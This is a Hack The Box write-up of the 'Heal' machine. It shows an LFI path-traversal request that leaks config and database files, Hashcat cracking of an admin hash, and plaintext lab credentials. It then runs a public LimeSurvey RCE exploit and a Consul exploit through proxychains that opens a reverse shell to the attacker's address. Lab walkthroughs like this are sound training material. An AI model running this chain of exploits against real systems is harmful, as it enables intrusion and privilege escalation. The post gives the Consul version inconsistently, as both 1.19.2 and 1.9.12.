---
title: "Heal - Hack The Box"
date: 2025-12-09T00:00:00-04:00
draft: false
toc: true
displayUpdatedDate: true
enableInlineShortcodes: true
layout: list
---

![Heal Logo](/assets/images/HTB/Heal/Heal-LOGO.png)

Heal is a Medium-rated Linux machine on Hack The Box that challenges us to exploit a web API and leverage misconfigurations in internal services. The initial foothold involves identifying an LFI vulnerability within a resume builder application, which leads to leaking the database of a LimeSurvey instance. After cracking the administrator password, we exploit an authenticated RCE (CVE-2021-44967) to gain a shell. Lateral movement is achieved by finding credentials in configuration files, and root privileges are obtained by exploiting a misconfigured Consul service using CVE-2021-41805.

{{< callout type="info" >}}
  Tags:

{{% details title="show tags"  closed="true" %}}
  - Linux
  - API
  - LFI
  - LimeSurvey
  - Web Shell
  - PostgreSQL
  - RCE
  - Consul
  - CVE-2021-44967
  - CVE-2021-41805
{{% /details %}}
{{< /callout >}}

## Enumeration

We start by enumerating the target with Nmap to identify open ports and services.

```bash
sudo nmap -sS -sV -sC -p22,80 -Pn -n -vvv -oA nmap/allPorts 10.10.11.46
```

### Port Scan
```bash
# Nmap 7.95 scan initiated Tue Apr  8 17:48:12 2025 as: /usr/lib/nmap/nmap -sS -sV -sC -p22,80 -Pn -n -vvv -oA nmap/allPorts 10.10.11.46
Nmap scan report for 10.10.11.46
Host is up, received user-set (0.054s latency).
Scanned at 2025-04-08 17:48:14 EDT for 9s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 68:af:80:86:6e:61:7e:bf:0b:ea:10:52:d7:7a:94:3d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFWKy4neTpMZp5wFROezpCVZeStDXH5gI5zP4XB9UarPr/qBNNViyJsTTIzQkCwYb2GwaKqDZ3s60sEZw362L0o=
|   256 52:f4:8d:f1:c7:85:b6:6f:c6:5f:b2:db:a6:17:68:ae (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILMCYbmj9e7GtvnDNH/PoXrtZbCxr49qUY8gUwHmvDKU
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://heal.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Apr  8 17:48:23 2025 -- 1 IP address (1 host up) scanned in 10.92 seconds
```
The scan reveals only two ports: *SSH (22)* and *HTTP (80)*. The web server redirects to **heal.htb**, so we add this to our /etc/hosts file.

Upon visiting http://heal.htb, we encounter a corporate page. A "Login" button is available, and inspecting the network traffic reveals that the site interacts with an API at api.heal.htb. We add this subdomain to our hosts file as well.

![API request on dev tools](/assets/images/HTB/Heal/Heal1.png)

### Web Discovery & LFI

After creating an account, we access a dashboard that allows us to build a *resume*. The final output is a *downloadable PDF.*
![resume PDF](/assets/images/HTB/Heal/Heal2.png)

Analyzing the download request with Burp Suite, we see a parameter `download?filename=` pointing to the generated file.

```
GET /download?filename=resume_123.pdf HTTP/1.1
Host: api.heal.htb
```

I attempted to modify this parameter to read sensitive files. Changing the filename to **/etc/hosts** successfully returns the file content, confirming a Local File Inclusion (LFI) vulnerability.

![Burp Filename changed](/assets/images/HTB/Heal/Heal3.png)

During further enumeration of the subdomains, I discovered **take-survey.heal.htb**, which hosts a *LimeSurvey* instance.

![take a survey page](/assets/images/HTB/Heal/Heal4.png)

### Extracting Credentials
Accessing index.php reveals the administrator user is ralph.

![LimeSurvey index page](/assets/images/HTB/Heal/Heal5.png)

Knowing the application uses Ruby (based on API headers) and LimeSurvey is present, I used the LFI to search for configuration files. I targeted the standard Rails config file *config/database.yml* via the API LFI:

```Bash
curl --path-as-is  -s -k -X $'GET' -H $'Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoyfQ.73dLFyR_K1A7yY9uDP6xu7H1p_c7DlFQEoN1g-LFFMQ' -H $'Referer: http://heal.htb/'  $'http://api.heal.htb/download?filename=../../config/database.yml'
```
![database.yml result](/assets/images/HTB/Heal/Heal6.png)


The output pointed to a SQLite *database* located at **storage/development.sqlite3**. Since curl output was empty for the binary file, I used Burp Suite to retrieve the database content.

![burp sqlite3 call](/assets/images/HTB/Heal/Heal7.png)
#### Cracking LimeSurvey Adminnistrator Hash.

The response contained a password hash for the user ralph: `$2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG`

I used Hashcat to crack this hash.

```Bash
hashcat -m 3200 ralph_hash_LS /usr/share/wordlists/rockyou.txt --force
```
- ***Password:*** 147258369

![Hashcat Result](/assets/images/HTB/Heal/Heal8.png)


## Foothold.

### Login To limeSurvey 


With the credentials **ralph:147258369**, I successfully logged into the LimeSurvey administrative dashboard at `http://take-survey.heal.htb/index.php/admin/authentication/sa/login`

![LimeSurvey Admin Page](/assets/images/HTB/Heal/Heal9.png)

The version installed is **6.6.4**, which is vulnerable to an Authenticated RCE (**CVE-2021-44967**). This vulnerability allows an attacker to *upload a malicious plugin*. I used a [python exploit script](https://github.com/TheRedP4nther/limesurvey-6.6.4-authenticated-rce.git) to automate the process.

***NOTE:*** For a full explanation about this exploit please click [Here!](https://ine.com/blog/cve-2021-44967-limesurvey-rce)

```bash
python3 limesurvey_rce.py -t [http://take-survey.heal.htb/](http://take-survey.heal.htb/) -u ralph@heal.htb -p 147258369
```

The exploit was successful, granting me a shell as ***www-data***.

## Privilege Escalation - Ron

Enumerating the file system, I found the LimeSurvey configuration file at `/var/www/limesurvey/application/config/config.php`. It contained credentials for a PostgreSQL database.

![LimeSurvey config.php](/assets/images/HTB/Heal/Heal10.png)

```php
'connectionString' => 'pgsql:host=localhost;port=5432;user=db_user;password=AdmiDi0_pA$$w0rd;dbname=survey',
```

I tested this password against the user *ron* found on the system.

```bash
ssh ron@heal.htb
# Password: AdmiDi0_pA$$w0rd
```

We successfully log in as **Ron** and we are able to get the *user.txt* flag.

![user.txt flag](/assets/images/HTB/Heal/Heal11.png)

## Privilege Escalation - Root.


Checking internal listening ports, I noticed port 8500 was active.

```bash
netstat -antp | grep 8500
```

This port belongs to HashiCorp - Consul(V 1.19.2). I used SSH dynamic port forwarding to access this service from my attacking machine.


```bash
 ssh -D 1234 ron@heal.htb
```
I visited http://127.0.0.1:8500. The dashboard showed Consul version 1.9.12, which is vulnerable to **CVE-2021-41805**.

![Consul v1.19.2](/assets/images/HTB/Heal/Heal12.png)


This vulnerability *involves an incorrect ACL implementation* where the default *operator:write* permission can be abused for privilege escalation. I used a public exploit to leverage this.

- https://github.com/acfirthh/CVE-2021-41805?tab=readme-ov-file

I run the exploit and open the listener to receive any possible connection.

```bash
proxychains python3 CVE-2021-41805.py -r 127.0.0.1 -rp 8500 -l 10.10.14.20 -lp 8080
```

The exploit creates a malicious service that executes a reverse shell. After running it, I received a connection back as root.

![Root.txt flag.](/assets/images/HTB/Heal/Heal13.png)


## References
- https://ine.com/blog/cve-2021-44967-limesurvey-rce
- https://github.com/TheRedP4nther/limesurvey-6.6.4-authenticated-rce
- https://github.com/acfirthh/CVE-2021-41805
